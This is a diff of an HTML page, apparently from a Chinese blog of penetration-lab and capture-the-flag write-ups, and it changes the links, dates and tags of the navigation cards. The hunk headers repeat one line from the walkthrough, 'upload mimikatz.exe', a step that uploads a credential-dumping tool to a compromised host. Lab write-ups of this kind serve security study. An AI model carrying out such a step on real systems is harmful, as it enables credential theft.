+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
                 <a href="/2026/02/15/magic-relay/">
                     <div class="card-image">
@@ -908,9 +1032,9 @@ upload mimikatz.exe .<span aria-hidden="true" class="line-numbers-rows"><span></
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2026-02-15
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2026-02-15
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
@@ -923,6 +1047,7 @@ upload mimikatz.exe .<span aria-hidden="true" class="line-numbers-rows"><span></
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
@@ -945,13 +1070,13 @@ upload mimikatz.exe .<span aria-hidden="true" class="line-numbers-rows"><span></
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2026/02/05/2026.1/">
+                <a href="/2026/02/06/tunnelx/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/16.jpg" class="responsive-img" alt="春秋杯冬季第一天">
+                        <img src="/medias/featureimages/12.jpg" class="responsive-img" alt="TunnelX">
                         
-                        <span class="card-title">春秋杯冬季第一天</span>
+                        <span class="card-title">TunnelX</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -962,7 +1087,7 @@ upload mimikatz.exe .<span aria-hidden="true" class="line-numbers-rows"><span></
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2026-02-05
+                                <i class="far fa-clock fa-fw icon-date"></i>2026-02-06
                             </span>
                         <span class="publish-author">
                             
@@ -979,12 +1104,12 @@ upload mimikatz.exe .<span aria-hidden="true" class="line-numbers-rows"><span></
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/ctf/">
-                        <span class="chip bg-color">ctf</span>
+                    <a href="/tags/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/">
+                        <span class="chip bg-color">春秋云镜</span>
                     </a>
                     
-                    <a href="/tags/wp/">
-                        <span class="chip bg-color">wp</span>
+                    <a href="/tags/%E6%B8%97%E9%80%8F/">
+                        <span class="chip bg-color">渗透</span>
                     </a>
                     
                 </div>
